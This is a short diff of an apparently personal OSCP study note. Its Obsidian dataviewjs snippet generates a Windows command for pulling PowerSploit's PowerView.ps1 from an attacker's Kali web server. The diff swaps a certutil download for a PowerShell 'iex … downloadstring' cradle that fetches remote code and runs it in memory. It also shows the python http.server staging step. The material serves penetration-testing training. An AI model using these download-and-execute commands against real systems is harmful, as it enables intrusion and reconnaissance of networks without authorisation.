@@ -5,19 +5,15 @@ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/ma
 ```
 cd ~/Desktop/Tools/Windows && python -m http.server 80
 ```
-
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `certutil -urlcache -split -f http://${KaliIP}:80/PowerView.ps1 PowerView.ps1`;
+const apage = dv.page("Synced OSCP Notes/Guides/Copy File From Kali to Windows target");const filename = apage?.["filename"] ?? "NO FILENAME FOUND";
+
+const command = `iex(new-object net.webclient).downloadstring('http://${KaliIP}:80/PowerView.ps1')`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
-Dot Source
-```powershell
-. .\PowerView.ps1
-```
-
 ---
 
 ```
